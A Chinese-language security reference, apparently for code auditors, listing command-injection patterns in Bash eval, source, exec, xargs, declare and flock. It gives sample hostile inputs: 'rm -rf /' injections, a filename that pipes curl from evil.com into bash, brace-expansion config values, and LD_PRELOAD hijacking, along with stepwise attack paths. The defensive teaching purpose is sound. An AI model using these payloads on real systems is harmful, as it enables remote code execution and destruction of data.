# eval / exec / source / xargs / declare / flock 命令安全风险

## 涉及的安全问题
- 命令注入（直接执行用户输入、参数注入）
- 跨脚本污点传播（source 加载外部文件）

## 高危模式

### 命令注入 — eval
```bash
eval "$USER_COMMAND"
eval "export ${USER_VAR}"
# USER_VAR = "PATH=/tmp/evil; malicious_cmd"
# eval 直接执行任意 shell 代码，最高风险
```

### 命令注入 — source / .
```bash
source "$CONFIG_FILE"
. "$USER_SCRIPT"
# 文件内容完全由攻击者控制
# source 等同于在当前 shell 中执行文件内容
```

### 命令注入 — exec
```bash
exec "$USER_COMMAND"
# 替换当前进程为任意命令
```

### 命令注入 — xargs
```bash
echo "$USER_INPUT" | xargs rm
# USER_INPUT = "-rf /"

echo "$USER_INPUT" | xargs -I{} cp {} /backup/
# USER_INPUT 可注入额外参数
```

### 命令注入 — eval + 通配符展开

```bash
# eval 配合通配符，文件名中的特殊字符被 shell 展开
eval check_file_path.sh ${FILE_PATH}
# FILE_PATH 为 test_`sleep${IFS}9999`.tar.gz
# 输入: eval check_file_path.sh test*.tar.gz
# 通配符展开后 sleep${IFS}9999 被执行

# 攻击者创建恶意文件名：
# test_`id`.tar.gz
# test_$(curl evil.com/backdoor|bash).tar.gz
```

### 命令注入 — source 配置文件注入

```bash
# source 配置文件时，配置值中包含 string {cmd,arg} 特征会被执行
# string 和 { 之间需存在空格
source /etc/app/config.conf
# config.conf 内容:
# PARAM1=normal_value
# PARAM2=test {touch,/tmp/pwned}
# PARAM2 中的 {touch,/tmp/pwned} 被花括号展开为命令执行

# 攻击路径：
# 1. 找到 source 引用配置文件的代码
# 2. 检查配置文件的 value 是否用户可控（如通过管理界面修改）
# 3. 注入 value = "string {malicious_cmd,arg}"
```

### 命令注入 — declare 参数注入

```bash
# declare 参数可控时，可通过 -x 设置环境变量
declare ${param}
# param = "-x PATH=/hacker:/usr/sbin:/usr/bin:/sbin:/bin"
# → 修改 PATH，后续命令执行被劫持

# param = "-x LD_PRELOAD=/hacker/evil.so"
# → 设置 LD_PRELOAD，结合上传的恶意 .so 实现方法劫持

# 攻击路径：
# 1. 找到 declare ${param} 的代码
# 2. param 来源是否可控（如从 JSON 配置文件读取）
# 3. 注入 -x 参数设置危险环境变量
# 4. 配合写入恶意脚本或 .so 文件到指定目录
```

### 命令注入 — flock -c 参数

```bash
# flock 用于管理文件锁，-c 参数通过 shell 执行命令
flock -ox filename -c "$cmd"
# $cmd 全部可控 → 直接执行任意命令
# $cmd 部分可控 → 通过拼接符（;、|、&&）注入

flock -ox /var/lock/myapp -c "process $USER_INPUT"
# USER_INPUT = "; rm -rf /"
```

### 跨脚本污点传播 — source 链
```bash
# scriptA.sh
source ./config.sh
eval "$ADMIN_CMD"
# 如果 config.sh 可被篡改，ADMIN_CMD 可执行任意命令
```
